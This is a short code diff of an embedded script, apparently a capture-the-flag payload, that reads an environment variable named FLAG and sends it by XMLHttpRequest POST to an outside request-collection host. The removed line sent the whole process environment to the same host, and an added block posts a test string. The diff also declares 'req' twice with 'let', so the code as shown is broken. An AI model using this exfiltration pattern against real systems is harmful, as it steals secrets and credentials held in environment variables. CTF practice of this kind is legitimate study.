@@ -1,5 +1,10 @@
 <script>
+    const flag = process.env.FLAG
     let req = new XMLHttpRequest();
     req.open("POST", "https://hkergwd.request.dreamhack.games");
-    req.send(process.env)
+    req.send(flag)
+
+    let req = new XMLHttpRequest();
+    req.open("POST", "https://hkergwd.request.dreamhack.games");
+    req.send("A")
 </script>
